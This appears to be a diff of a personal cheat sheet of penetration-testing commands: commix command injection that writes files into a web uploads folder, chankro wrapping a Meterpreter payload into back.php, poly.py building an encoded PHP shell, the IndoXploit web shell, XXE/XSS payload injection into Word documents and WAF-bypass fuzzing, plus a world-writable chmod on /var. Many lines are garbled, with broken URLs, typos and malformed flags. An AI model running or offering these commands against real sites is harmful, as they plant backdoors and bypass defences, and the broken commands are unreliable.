@@ -71,14 +71,15 @@ apt-get install nfs4-acl-tools-acl
 mount | grep -i root && chmod -R a-w /var
 chmod u=rwx, g=rwx, o=rwx /var
 adduser -home /dragonfly dragonfly
-getent group dragonfly   #  visar /etc/group
+getent group dragonfly   #  /etc/group
 usermod -aG sudo dragonfly
 gpasswd -a dragonfly 
 sudo mv dawn* /dragonfly && ssl -l dragonfly
 bundle install && rake install
 
 python3 arjun.py -u http://localhost/ajax/
-commix --url="http//localhost/ajax/" -file-write=/root/Pictures/kali.png  --file-dest=uploads/ --data="name=Fawkes&email=fox@gmail.com8submit=submit" -cookie=tvisited=94..23c" --proxy="httpc/127.0.0.1:8080/" 
+commix --url="http//localhost/ajax/" -file-write=/root/Pictures/kali.png  --file-dest=uploads/ \
+--data="name=Fun&email=fox@gmail.com8submit=submit" -cookie=tvisited=94..23c" --proxy="127..:8080/" 
 ./parameth.py -u http://localhost/act.php
 commix --url="http://localhost/demo.php --data="name=fun&weight=fun" --web-root=/opt/lampp/
 
@@ -95,12 +96,12 @@ apt-get install libnet-rawip-perl
 perl witchxtool.pl
 
 poly.py -c php -e b64 -p SHELL -j
-docem.py -5 samples/xxe/sample_oxml_xxe_mod0/ -pm XSS -pf payloads/xss_all.txt -pt per_document -kt -sx docx
+docem.py -5 sample_oxml_xxe_mod0/ -pm XSS -pf payloads/xss_all.txt -pt per_document -kt -sx docx
 chankro.py --arch 64 --input METER --output back.php
 bash Remot3d IndoXploit th3_p4ssw0rd_l0ck3
 make && gcc -Wall -Wextra -o drink me.c
 cat hello_world.x86_64 | ./drinkme
-wafninja.py fuzz -u "http://localhost/action.php?id=FUZZ/" -c "phpsessid=value" -t xss -o output.html
+wafninja.py fuzz -u "http://localhost/action.php?id=FUZZ/" -c "phpsessid=value" -t xss -o out.html
 wafpass.py --url http://localhost/action.phpPname=fun8oweigth=fun
 
 scrapy genspider -t crawl exam coinbase.com
